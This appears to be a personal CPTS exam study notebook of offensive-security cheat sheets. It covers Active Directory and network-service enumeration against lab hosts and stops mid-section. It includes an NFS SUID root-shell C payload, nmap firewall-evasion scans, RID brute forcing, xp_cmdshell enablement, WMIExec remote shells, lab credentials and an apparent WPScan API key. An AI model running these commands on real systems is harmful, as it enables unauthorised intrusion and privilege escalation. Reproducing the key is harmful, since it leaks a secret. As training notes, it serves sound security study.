# Vernon's CPTS notes

Personal reference; consult COMPETITION.md before using a tool during the event.

- [External Resources.md](#cpts-external-resources-8d4c7c1a)
- [Things to run on base Kali.md](#cpts-things-to-run-on-base-kali-16524e15)
- [Enumeration/AD Enumeration/Advanced Domain Enumeration.md](#cpts-enumeration-ad-enumeration-advanced-domain-enumeration-ea04e6f6)
- [Enumeration/AD Enumeration/Basic Enumeration.md](#cpts-enumeration-ad-enumeration-basic-enumeration-aa8ec53e)
- [Enumeration/AD Enumeration/Methodology.md](#cpts-enumeration-ad-enumeration-methodology-4ece01a2)
- [Enumeration/AD Enumeration/Password Policy Discovery.md](#cpts-enumeration-ad-enumeration-password-policy-discovery-75263604)
- [Enumeration/AD Enumeration/User Enumeration.md](#cpts-enumeration-ad-enumeration-user-enumeration-247f74c0)
- [Enumeration/Basic Enumeration/netcat.md](#cpts-enumeration-basic-enumeration-netcat-3782f2cb)
- [Enumeration/Basic Enumeration/nmap.md](#cpts-enumeration-basic-enumeration-nmap-71f192fc)
- [Enumeration/Basic Enumeration/whatweb.md](#cpts-enumeration-basic-enumeration-whatweb-968b4bb4)
- [Enumeration/Basic Enumeration/wpscan.md](#cpts-enumeration-basic-enumeration-wpscan-f89cb6da)
- [Enumeration/Service Enumeration/111,2049 nfs.md](#cpts-enumeration-service-enumeration-111-2049-nfs-e3cbe8f1)
- [Enumeration/Service Enumeration/135 WMI.md](#cpts-enumeration-service-enumeration-135-wmi-e1af59a1)
- [Enumeration/Service Enumeration/139,445 smb.md](#cpts-enumeration-service-enumeration-139-445-smb-fb8e6af0)
- [Enumeration/Service Enumeration/143,993 imap-pop3.md](#cpts-enumeration-service-enumeration-143-993-imap-pop3-52cb67bb)
- [Enumeration/Service Enumeration/1433 mssql.md](#cpts-enumeration-service-enumeration-1433-mssql-0715e518)
- [Enumeration/Service Enumeration/1521 oracle-tns.md](#cpts-enumeration-service-enumeration-1521-oracle-tns-40e2c3f8)
- [Enumeration/Service Enumeration/161,162 snmp.md](#cpts-enumeration-service-enumeration-161-162-snmp-122c9bd9)
- [Enumeration/Service Enumeration/21 ftp.md](#cpts-enumeration-service-enumeration-21-ftp-2bf7eeb6)
- [Enumeration/Service Enumeration/22 ssh.md](#cpts-enumeration-service-enumeration-22-ssh-cb7e3280)
- [Enumeration/Service Enumeration/25,587 smtp.md](#cpts-enumeration-service-enumeration-25-587-smtp-a77466e5)
- [Enumeration/Service Enumeration/3306 mysql.md](#cpts-enumeration-service-enumeration-3306-mysql-3d7e83f5)
- [Enumeration/Service Enumeration/3389 rdp.md](#cpts-enumeration-service-enumeration-3389-rdp-2169bdb7)
- [Enumeration/Service Enumeration/512-514 r-services.md](#cpts-enumeration-service-enumeration-512-514-r-services-39d8144a)
- [Enumeration/Service Enumeration/53 dns.md](#cpts-enumeration-service-enumeration-53-dns-982aa88f)
- [Enumeration/Service Enumeration/5985,5986 WinRM.md](#cpts-enumeration-service-enumeration-5985-5986-winrm-4ff73d47)
- [Enumeration/Service Enumeration/623 IPMI.md](#cpts-enumeration-service-enumeration-623-ipmi-fd1b107c)
- [Enumeration/Service Enumeration/80,443 http.md](#cpts-enumeration-service-enumeration-80-443-http-3d6bc3e8)
- [Enumeration/Service Enumeration/873 rsync.md](#cpts-enumeration-service-enumeration-873-rsync-1ea34b15)
- [Enumeration/Service Enumeration/Public Exploits.md](#cpts-enumeration-service-enumeration-public-exploits-06f789b1)
- [Exploits/Bind Shell.md](#cpts-exploits-bind-shell-47d00c53)
- [Exploits/Password Cracking.md](#cpts-exploits-password-cracking-c9c27216)
- [Exploits/Password Spraying (Brute forcing).md](#cpts-exploits-password-spraying-brute-forcing-002cc339)
- [Exploits/Reverse Shell.md](#cpts-exploits-reverse-shell-a7dfcd09)
- [Exploits/AD-Exploits/AS-REP Roasting.md](#cpts-exploits-ad-exploits-as-rep-roasting-fe53b24b)
- [Exploits/AD-Exploits/DCSync Attack.md](#cpts-exploits-ad-exploits-dcsync-attack-6c94bd8d)
- [Exploits/AD-Exploits/Kerberoasting.md](#cpts-exploits-ad-exploits-kerberoasting-8eb4e711)
- [Exploits/AD-Exploits/LLMNR-NBTNS Poisoning.md](#cpts-exploits-ad-exploits-llmnr-nbtns-poisoning-d7c6a994)
- [Exploits/AD-Exploits/Silver Ticket Attack.md](#cpts-exploits-ad-exploits-silver-ticket-attack-996b78a5)
- [Exploits/Service-Exploits/DNS.md](#cpts-exploits-service-exploits-dns-1358e590)
- [Exploits/Service-Exploits/FTP.md](#cpts-exploits-service-exploits-ftp-73147af4)
- [Exploits/Service-Exploits/RDP.md](#cpts-exploits-service-exploits-rdp-76d94045)
- [Exploits/Service-Exploits/SMB.md](#cpts-exploits-service-exploits-smb-0ab037f4)
- [Exploits/Service-Exploits/SMTP-IMAP-POP3.md](#cpts-exploits-service-exploits-smtp-imap-pop3-ff983f4e)
- [Exploits/Service-Exploits/SQL.md](#cpts-exploits-service-exploits-sql-fcb4d003)
- [Misc/Convert ccache or kirbi file to and fro.md](#cpts-misc-convert-ccache-or-kirbi-file-to-and-fro-9b4c4171)
- [Misc/Double Pivot.md](#cpts-misc-double-pivot-ac26bf28)
- [Misc/Gaining Shell Access.md](#cpts-misc-gaining-shell-access-b83293f9)
- [Misc/MS Office Macro.md](#cpts-misc-ms-office-macro-8ec8c7ff)
- [Misc/Pivot with Ligolo.md](#cpts-misc-pivot-with-ligolo-111fca60)
- [Misc/Runas another user.md](#cpts-misc-runas-another-user-4be36188)
- [Misc/Search for flag on compromised system.md](#cpts-misc-search-for-flag-on-compromised-system-225a86d6)
- [Misc/Transferring Files (Linux).md](#cpts-misc-transferring-files-linux-5d70baa3)
- [Misc/Transferring Files (Windows).md](#cpts-misc-transferring-files-windows-089b5bd9)
- [Misc/Transferring Files.md](#cpts-misc-transferring-files-9a1f8b61)
- [Misc/make new admin user in windows.md](#cpts-misc-make-new-admin-user-in-windows-e17c21fa)
- [Misc/non-tty shell to tty shell.md](#cpts-misc-non-tty-shell-to-tty-shell-7f6f46ec)
- [Post Exploits/Port Forwarding.md](#cpts-post-exploits-port-forwarding-d33c6cbd)
- [Post Exploits/Linux/Cracking Login Credentials.md](#cpts-post-exploits-linux-cracking-login-credentials-3cabf121)
- [Post Exploits/Linux/Credential Hunting.md](#cpts-post-exploits-linux-credential-hunting-a70f40cf)
- [Post Exploits/Linux/Pass the Ticket (PtT).md](#cpts-post-exploits-linux-pass-the-ticket-ptt-5b0106aa)
- [Post Exploits/Windows/DCOM.md](#cpts-post-exploits-windows-dcom-f7ad3a18)
- [Post Exploits/Windows/Dumping out CredMan.md](#cpts-post-exploits-windows-dumping-out-credman-2c400c4d)
- [Post Exploits/Windows/Dumping out LSASS.md](#cpts-post-exploits-windows-dumping-out-lsass-3b7b98dd)
- [Post Exploits/Windows/Dumping out NTDS.dit.md](#cpts-post-exploits-windows-dumping-out-ntds-dit-ad0fd253)
- [Post Exploits/Windows/Dumping out SAM.md](#cpts-post-exploits-windows-dumping-out-sam-8475da60)
- [Post Exploits/Windows/Invoke-RunasCs.md](#cpts-post-exploits-windows-invoke-runascs-82bcc924)
- [Post Exploits/Windows/NTLMv2 Relay.md](#cpts-post-exploits-windows-ntlmv2-relay-1a9fa4cb)
- [Post Exploits/Windows/Overpass the Hash.md](#cpts-post-exploits-windows-overpass-the-hash-9f40f285)
- [Post Exploits/Windows/Pass the Hash.md](#cpts-post-exploits-windows-pass-the-hash-b577bda5)
- [Post Exploits/Windows/Pass the Ticket (PtT).md](#cpts-post-exploits-windows-pass-the-ticket-ptt-22d39f78)
- [Post Exploits/Windows/Psexec.md](#cpts-post-exploits-windows-psexec-54de10de)
- [Post Exploits/Windows/Searching for traces.md](#cpts-post-exploits-windows-searching-for-traces-30841cff)
- [Post Exploits/Windows/WMI & WinRM.md](#cpts-post-exploits-windows-wmi-winrm-6f7840cf)
- [PrivEsc/$PATH.md](#cpts-privesc-path-83561099)
- [PrivEsc/SSH Keys.md](#cpts-privesc-ssh-keys-9d5895fc)
- [PrivEsc/Scripts.md](#cpts-privesc-scripts-c4d7f139)
- [PrivEsc/Service Binary Hijacking-MacBook Pro.md](#cpts-privesc-service-binary-hijacking-macbook-pro-4551c4c6)
- [PrivEsc/User Privileges.md](#cpts-privesc-user-privileges-db86feff)
- [PrivEsc/Vulnerable Software.md](#cpts-privesc-vulnerable-software-0b603bf7)
- [PrivEsc/Linux/Crontabs (Scheduled Tasks).md](#cpts-privesc-linux-crontabs-scheduled-tasks-ae8a4f87)
- [PrivEsc/Linux/Exposed Confidential Info.md](#cpts-privesc-linux-exposed-confidential-info-9d2298c6)
- [PrivEsc/Linux/Methodology Checklist.md](#cpts-privesc-linux-methodology-checklist-c0fa3016)
- [PrivEsc/Linux/OS and Kernel Exploits.md](#cpts-privesc-linux-os-and-kernel-exploits-0610e3eb)
- [PrivEsc/Linux/Path Abuse.md](#cpts-privesc-linux-path-abuse-b5a507cc)
- [PrivEsc/Linux/SUID Sticky Bit.md](#cpts-privesc-linux-suid-sticky-bit-a4af3b7a)
- [PrivEsc/Linux/Write perms to etc passwd.md](#cpts-privesc-linux-write-perms-to-etc-passwd-8d41f403)
- [PrivEsc/Windows/Admin user with no admin privileges.md](#cpts-privesc-windows-admin-user-with-no-admin-privileges-19acc37f)
- [PrivEsc/Windows/DLL Hijacking.md](#cpts-privesc-windows-dll-hijacking-3a400c32)
- [PrivEsc/Windows/Exposed Credentials.md](#cpts-privesc-windows-exposed-credentials-09889ee3)
- [PrivEsc/Windows/Methodology Checklist.md](#cpts-privesc-windows-methodology-checklist-32314143)
- [PrivEsc/Windows/Scheduled Tasks.md](#cpts-privesc-windows-scheduled-tasks-2dc078d8)
- [PrivEsc/Windows/Service Binary Hijacking.md](#cpts-privesc-windows-service-binary-hijacking-ada39c1a)
- [PrivEsc/Windows/Services Automatically Started on Boot.md](#cpts-privesc-windows-services-automatically-started-on-boot-769440ef)
- [PrivEsc/Windows/Unquoted Service Paths.md](#cpts-privesc-windows-unquoted-service-paths-53b627a0)
- [Reconnaissance/AD Reconnaissance.md](#cpts-reconnaissance-ad-reconnaissance-cbb23af1)
- [Reconnaissance/Cloud Resources.md](#cpts-reconnaissance-cloud-resources-836ba495)
- [Reconnaissance/Domain Discovery.md](#cpts-reconnaissance-domain-discovery-d1213c29)
- [Reconnaissance/Host Discovery.md](#cpts-reconnaissance-host-discovery-a202aa9e)
- [Reconnaissance/Password Hunting.md](#cpts-reconnaissance-password-hunting-d3163f7e)
- [Reconnaissance/Username Discovery.md](#cpts-reconnaissance-username-discovery-3e712759)
- [Reconnaissance/Web Reconnaissance.md](#cpts-reconnaissance-web-reconnaissance-2c284fa9)

---

<a id="cpts-external-resources-8d4c7c1a"></a>

<a id="cpts-external-resources-8d4c7c1a--external-resources"></a>

# External Resources


<https://github.com/missteek/cpts-quick-references>


---

<a id="cpts-things-to-run-on-base-kali-16524e15"></a>

<a id="cpts-things-to-run-on-base-kali-16524e15--things-to-run-on-base-kali"></a>

# Things to run on base Kali


Install WAFW00F

```shell-session
pip3 install git+https://github.com/EnableSecurity/wafw00f
```

Install Scrapy
sudo apt search scrapy
sudo apt install python3-scrapy


---

<a id="cpts-enumeration-ad-enumeration-advanced-domain-enumeration-ea04e6f6"></a>

<a id="cpts-enumeration-ad-enumeration-advanced-domain-enumeration-ea04e6f6--advanced-domain-enumeration"></a>

# Advanced Domain Enumeration


<a id="cpts-enumeration-ad-enumeration-advanced-domain-enumeration-ea04e6f6--windapsearch"></a>

### Windapsearch
```shell
cd cpts-tools/windapsearch
python -m venv myfirstproject
source myfirstproject/bin/activate
pip3 install python-ldap

#Domain Admins
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da

#Privileged Users
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
```

<a id="cpts-enumeration-ad-enumeration-advanced-domain-enumeration-ea04e6f6--bloodhound"></a>

### Bloodhound
```shell
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all 

.\SharpHound.exe -c All --zipfilename ILFREIGHT
```
On Kali 2024
```shell
sudo neo4j start
bloodhound
(neo4j/neo4j1)
```


---

<a id="cpts-enumeration-ad-enumeration-basic-enumeration-aa8ec53e"></a>

<a id="cpts-enumeration-ad-enumeration-basic-enumeration-aa8ec53e--basic-enumeration"></a>

# Basic Enumeration


```powershell
Get-Module
Import-Module ActiveDirectory
```

<a id="cpts-enumeration-ad-enumeration-basic-enumeration-aa8ec53e--get-domain-info"></a>

### Get Domain Info
```powershell
Get-ADDomain
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
Get-ADTrust -Filter *
Get-ADGroup -Filter * | select name
Get-ADGroup -Identity "Backup Operators"
Get-ADGroupMember -Identity "Backup Operators"
```

<a id="cpts-enumeration-ad-enumeration-basic-enumeration-aa8ec53e--powerview"></a>

### Powerview
```powershell
import-module .\Powerview.ps1

Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol

Get-DomainGroupMember -Identity "Domain Admins" -Recurse

Get-DomainTrustMapping

Test-AdminAccess -ComputerName ACADEMY-EA-MS01

Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```

<a id="cpts-enumeration-ad-enumeration-basic-enumeration-aa8ec53e--snaffler"></a>

### Snaffler
Searches for sensitive files in shares and displays them (VERY USEFUL)
```powershell
.\Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```

<a id="cpts-enumeration-ad-enumeration-basic-enumeration-aa8ec53e--arp-find-other-hosts"></a>

#### ARP (find other hosts)
```powershell
arp -a
```

<a id="cpts-enumeration-ad-enumeration-basic-enumeration-aa8ec53e--view-routing-table"></a>

#### View routing table
```powershell
route print
```

<a id="cpts-enumeration-ad-enumeration-basic-enumeration-aa8ec53e--quick-wmi-checks"></a>

#### Quick WMI checks
```powershell
wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress
```

<a id="cpts-enumeration-ad-enumeration-basic-enumeration-aa8ec53e--net-checks"></a>

#### Net checks
![Pasted image 20250831200044.png](cpts/assets/Pasted%20image%2020250831200044.png)

<a id="cpts-enumeration-ad-enumeration-basic-enumeration-aa8ec53e--dsquery"></a>

#### Dsquery
```powershell
dsquery user
dsquery computer
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```


---

<a id="cpts-enumeration-ad-enumeration-methodology-4ece01a2"></a>

<a id="cpts-enumeration-ad-enumeration-methodology-4ece01a2--methodology"></a>

# Methodology


1. Simple Enumeration
2. Use our own scripts
3. Powerview.ps1
4. PsLoggedon.exe

---

Use Net to find out more about user,domain etc
```cmd
net user /domain
net user jeff
net user jeffadmin /domain
net group /domain
net group "Sales Department" /domain
```

Use our own scripts
```powershell
powershell -exec bypass
Import-Module .\function.ps1\ #can get it from cpts-tools

LDAPSearch -LDAPQuery "(samAccountType=805306368)"
LDAPSearch -LDAPQuery "(objectclass=group)"
foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) {
$group.properties | select {$_.cn}, {$_.member}

$sales = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Sales Department))"
$sales.properties.member
}
```

Powerview
```powershell
powershell -exec bypass
Import-Module .\PowerView.ps1 #get from cpts-tools

# List of enumeration commands
Get-NetDomain
Get-NetUser
Get-NetUser | select cn
Get-NetUser | select cn,pwdlastset,lastlogon
Get-NetGroup | select cn
Get-NetGroup "Sales Department" | select member

Get-NetComputer
Get-NetComputer | select operatingsystem,dnshostname

#See where user accounts have logged into
Find-LocalAdminAccess
Get-NetSession
Get-NetSession -ComputerName files04 -Verbose
Get-NetSession -ComputerName web04

#Object enumeration
Get-ObjectAcl -Identity stephanie
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104

# use this command and look out for generic all, then use the sid to see what it is
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104" | Convert-SidToName

#domain share enumeration
Find-DomainShare

```

PsLoggedOn (this can check for logon sessions btr than powerview)
```powershell
.\PsLoggedon.exe \\files04 #where the \\files04 is the name of the pc
.\PsLoggedon.exe \\web04
```

Get Service principal names
```cmd
setspn -L iis_service
```
```powershell
Get-NetUser -SPN | select samaccountname,serviceprincipalname
```

---
<a id="cpts-enumeration-ad-enumeration-methodology-4ece01a2--bloodhound"></a>

#### Bloodhound
```powershell
# run sharphound on the target domain first
powershell -ep bypass
Import-Module .\Sharphound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"

#ON BASE KALI
sudo neo4j start
bloodhound #AUTH USING neo4j1:neo4j1
```


---

<a id="cpts-enumeration-ad-enumeration-password-policy-discovery-75263604"></a>

<a id="cpts-enumeration-ad-enumeration-password-policy-discovery-75263604--password-policy-discovery"></a>

# Password Policy Discovery

<a id="cpts-enumeration-ad-enumeration-password-policy-discovery-75263604--using-rpcclient"></a>

#### Using rpcclient
```shell
rpcclient -U "" -N 172.16.5.5
rpcclient $> querydominfo
rpcclient $> getdompwinfo
```

<a id="cpts-enumeration-ad-enumeration-password-policy-discovery-75263604--using-enum4linux"></a>

#### Using enum4linux
```shell
enum4linux -P 172.16.5.5
enum4linux-ng -P 172.16.5.5 -oA ilfreight #use this for output
```

<a id="cpts-enumeration-ad-enumeration-password-policy-discovery-75263604--using-ldapsearch"></a>

#### Using ldapsearch
```shell
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

<a id="cpts-enumeration-ad-enumeration-password-policy-discovery-75263604--netexe-from-windows-cmd"></a>

### net.exe (from windows cmd)
```cmd
net accounts
```

<a id="cpts-enumeration-ad-enumeration-password-policy-discovery-75263604--using-powerview-from-windows-powershell"></a>

#### Using PowerView (from windows powershell)
```powershell
import-module .\PowerView.ps1
Get-DomainPolicy
```


---

<a id="cpts-enumeration-ad-enumeration-user-enumeration-247f74c0"></a>

<a id="cpts-enumeration-ad-enumeration-user-enumeration-247f74c0--user-enumeration"></a>

# User Enumeration


Find available domain user accounts

<a id="cpts-enumeration-ad-enumeration-user-enumeration-247f74c0--using-enum4linux"></a>

### Using Enum4linux
```shell
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

<a id="cpts-enumeration-ad-enumeration-user-enumeration-247f74c0--using-rpcclient"></a>

### Using rpcclient
```shell
rpcclient -U "" -N 172.16.5.5
rpcclient $> enumdomusers 
```


<a id="cpts-enumeration-ad-enumeration-user-enumeration-247f74c0--using-crackmapexec-users-flag"></a>

### Using CrackMapExec --users Flag
```shell
crackmapexec smb 172.16.5.5 --users
sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
```

<a id="cpts-enumeration-ad-enumeration-user-enumeration-247f74c0--gathering-users-with-ldap-anonymous"></a>

### Gathering Users with LDAP Anonymous
```shell
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```

<a id="cpts-enumeration-ad-enumeration-user-enumeration-247f74c0--using-windapsearch"></a>

### Using windapsearch
```shell
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```

<a id="cpts-enumeration-ad-enumeration-user-enumeration-247f74c0--kerbrute-user-enumeration"></a>

### Kerbrute User Enumeration
```shell
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
```


---

<a id="cpts-enumeration-basic-enumeration-netcat-3782f2cb"></a>

<a id="cpts-enumeration-basic-enumeration-netcat-3782f2cb--netcat"></a>

# netcat


 Banner Grabbing
```bash
nc -nv 10.129.42.253 21
```


---

<a id="cpts-enumeration-basic-enumeration-nmap-71f192fc"></a>

<a id="cpts-enumeration-basic-enumeration-nmap-71f192fc--nmap"></a>

# nmap


 Full and thorough scan
```bash
nmap -sV -sC -p- -v 10.129.42.253
```

 Specific Scripts
```bash
 locate scripts/citrix
 nmap --script <script name> -p<port> <host>
```

 Banner Grabbing
```bash
 nmap -sV --script=banner <target>
 nmap -sV --script=banner -p21 10.10.10.0/24
```

Output to file flags
- Normal output (`-oN`) with the `.nmap` file extension
- Grepable output (`-oG`) with the `.gnmap` file extension
- XML output (`-oX`) with the `.xml` file extension
- ALL of the above (-oA)
```bash
sudo nmap 10.129.2.28 -p- -oA target
```

Viewing in browser with stylesheet
```bash
xsltproc target.xml -o target.html
firefox target.html
```


<a id="cpts-enumeration-basic-enumeration-nmap-71f192fc--useful-flags"></a>

#### Useful Flags
```bash
--stats-every=5s (Updates console every 5 seconds of progress)

-v (verbose)

-vv (OMEGA verbose)

-T1 to -T5 (Speed)

-sS (stealth scan)

-sU (UDP scan)

-sV (Probe open ports for service/version)

-p (scans top 1000 ports if left blank or you can specify range)

-p- (scans all 65535 ports)

-O (gets operating system information)

-A (basically -O, -sV, -sC, Traceroute) all in one

--packet-trace (show all packets sent and received)
```

<a id="cpts-enumeration-basic-enumeration-nmap-71f192fc--firewall-evasion-techniques"></a>

#### Firewall Evasion Techniques

Send ACK packet only
```bash
sudo nmap 10.129.2.28 -p 21,22,25 -sA -Pn -n --disable-arp-ping --packet-trace
```
Decoy scan
```bash
sudo nmap 10.129.2.28 -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5
```
Scan using different source IP
```bash
sudo nmap 10.129.2.28 -n -Pn -p 445 -O -S 10.129.2.200 -e tun0
```
DNS Proxying
```bash
sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port 53

ncat -nv --source-port 53 10.129.2.47 50000
```



---

<a id="cpts-enumeration-basic-enumeration-whatweb-968b4bb4"></a>

<a id="cpts-enumeration-basic-enumeration-whatweb-968b4bb4--whatweb"></a>

# whatweb

Just another method of banner grabbing but for http

```bash
whatweb 10.129.42.190
whatweb http://10.129.42.190/nibbleblog
```

![Pasted image 20250325092955.png](cpts/assets/Pasted%20image%2020250325092955.png)




---

<a id="cpts-enumeration-basic-enumeration-wpscan-f89cb6da"></a>

<a id="cpts-enumeration-basic-enumeration-wpscan-f89cb6da--wpscan"></a>

# wpscan

`- Wordpress password begin with ```$P$B```
- API-Key 5SakvURaMPAgT1WkWrqlKF7u8plizyI95lmt6OsdcVo



---

<a id="cpts-enumeration-service-enumeration-111-2049-nfs-e3cbe8f1"></a>

<a id="cpts-enumeration-service-enumeration-111-2049-nfs-e3cbe8f1--1112049-nfs"></a>

# 111,2049 nfs

 Scan commands
```shell
sudo nmap 10.129.14.128 -p111,2049 -sV -sC
```

 NSE Scripts
```shell
sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049
```

Show available NFS Shares
```shell
showmount -e 10.129.14.128
```

Mount available NFS Share on kali
```shell
vernonlim03@htb[/htb]$ mkdir target-NFS
vernonlim03@htb[/htb]$ sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock
vernonlim03@htb[/htb]$ cd target-NFS
vernonlim03@htb[/htb]$ tree .
```

Listing of NFS contents
- The owners of the files/folders will be the same as on the NFS Server
- If root_squash in config file is on, backup.sh files cannot be edited on kali even as root
```shell
ls -l mnt/nfs/
ls -n mnt/nfs/
```

<a id="cpts-enumeration-service-enumeration-111-2049-nfs-e3cbe8f1--suid-binary-exploit"></a>

##### SUID Binary exploit
- Must have SSH access to the victim machine
- Check /etc/exports on victim machine to see if no_root_squash is enabled

Payload in C
```C
#include <unistd.h>
int main() {
    setuid(0); // Change to root (or target user's UID)
    system("/bin/bash");
    return 0;
}
```

Compile above code and upload to mounted NFS Share and add suid on the binaryu
```bash
gcc shell.c -o shell -static
cp shell /tmp/nfs_mount/
chmod +s /tmp/nfs_mount/shell
```

Login to ssh and run the shell
```bash
/path/to/nfs_share/shell
cat /home/user/secret.txt
```

Default config file on victim machine
```
/etc/exports
```

Unmounting nfs share
```bash
cd ..
sudo umount ./target-NFS
```


---

<a id="cpts-enumeration-service-enumeration-135-wmi-e1af59a1"></a>

<a id="cpts-enumeration-service-enumeration-135-wmi-e1af59a1--135-wmi"></a>

# 135 WMI

Basic Commands
```
nmap -sV -sC -p 135 10.129.120.23
```

WMIExec.py (Gain shell access)
```shell
/usr/share/doc/python3-impacket/examples/wmiexec.py Cry0l1t3:"P455w0rD!"@10.129.201.248 "hostname"
```


---

<a id="cpts-enumeration-service-enumeration-139-445-smb-fb8e6af0"></a>

<a id="cpts-enumeration-service-enumeration-139-445-smb-fb8e6af0--139445-smb"></a>

# 139,445 smb


 Basic commands
```bash
nmap --script smb-os-discovery.nse -p 139,445 10.10.10.40
nmap -A -sV -sC -p 139,445 10.129.42.253
smbclient -N -L \\\\10.129.42.253
```

RPCclient
```shell
rpcclient -U "" -N 10.129.14.128
```
![Pasted image 20250401015814.png](cpts/assets/Pasted%20image%2020250401015814.png)
BruteForcing User RIDs
```shell
vernonlim03@htb[/htb]$ for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done

vernonlim03@htb[/htb]$ samrdump.py 10.129.14.128
```

 Listing Contents within particular share
```bash
smbclient \\\\10.129.42.253\\users
```

Adding Login Credentials (Use the -U flag)
```bash
smbclient -U bob \\\\10.129.42.253\\users
```

SMBmap
```shell
smbmap -H 10.129.14.128
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'SHARE NAME' --dir-only
```

NetExec
```shell
netexec smb 10.129.14.128 --shares -u '' -p ''
```

Enum4Linux-ng
```shell-session
cd /Desktop/cpts-tools/enum4linux-ng
./enum4linux-ng.py 10.129.14.128 -A
```

Default Config File
```shell
cat /etc/samba/smb.conf | grep -v "#\|\;" 
```

Download a file in smbclient
```shell
smb: \> get prep-prod.txt
smb: \> !ls
```

<a id="cpts-enumeration-service-enumeration-139-445-smb-fb8e6af0--add-in-front-of-bash-commands-without-interrupting-connection"></a>

##### ADD ! IN FRONT OF BASH COMMANDS WITHOUT INTERRUPTING CONNECTION

smbclient commands
![Pasted image 20250401014737.png](cpts/assets/Pasted%20image%2020250401014737.png)

Check for live connections on victim machine
```shell-status
root@samba:~# smbstatus
```


Recursive download of whole share
```bash
smbclient //server/share -U username%password -c "prompt; recurse; mget *"
```


---

<a id="cpts-enumeration-service-enumeration-143-993-imap-pop3-52cb67bb"></a>

<a id="cpts-enumeration-service-enumeration-143-993-imap-pop3-52cb67bb--143993-imap-pop3"></a>

# 143,993 imap-pop3


Basic Commands
```shell
sudo nmap 10.129.14.128 -sV -p110,143,993,995 -sC
curl -k 'imaps://10.129.14.128' --user user:p4ssw0rd
curl -k 'imaps://10.129.14.128' --user cry0l1t3:1234 -v
```

OpenSSL (Connect over SSL)
```shell
openssl s_client -connect 10.129.14.128:pop3s
openssl s_client -connect 10.129.14.128:imaps
```

![Pasted image 20250402015201.png](cpts/assets/Pasted%20image%2020250402015201.png)
![Pasted image 20250402015214.png](cpts/assets/Pasted%20image%2020250402015214.png)

<a id="cpts-enumeration-service-enumeration-143-993-imap-pop3-52cb67bb--list-all-email-contents-in-the-inboxes"></a>

##### List all email contents in the inboxes
```bash
a1 LOGIN "username" "password"   # Authenticate
a2 LIST "" "*"                   # List all mailboxes
a3 SELECT INBOX                  # Access INBOX
a4 FETCH 1:* (FLAGS BODY.PEEK[]) # Fetch all emails
a5 LOGOUT                        # Disconnect
```


---

<a id="cpts-enumeration-service-enumeration-1433-mssql-0715e518"></a>

<a id="cpts-enumeration-service-enumeration-1433-mssql-0715e518--1433-mssql"></a>

# 1433 mssql


Basic Commands
```shell
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248

msfconsole
use scanner/mssql/mssql_ping
set rhosts
run
```

Connecting with mssqlclient.py
```shell
python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py backdoor@10.129.208.220 -windows-auth

impacket-mssqlclient Administrator:Lab123@192.168.238.18 -windows-auth
```

mssqlclient commands (display databases)
```bash
SQL (ILF-SQL-01\backdoor  dbo@master)> select name from sys.databases
```

Using xp_cmdshell to get shell access
```shell
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

EXECUTE xp_cmdshell 'whoami';

```


---

<a id="cpts-enumeration-service-enumeration-1521-oracle-tns-40e2c3f8"></a>

<a id="cpts-enumeration-service-enumeration-1521-oracle-tns-40e2c3f8--1521-oracle-tns"></a>

# 1521 oracle-tns


Basic Commands
```shell
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute

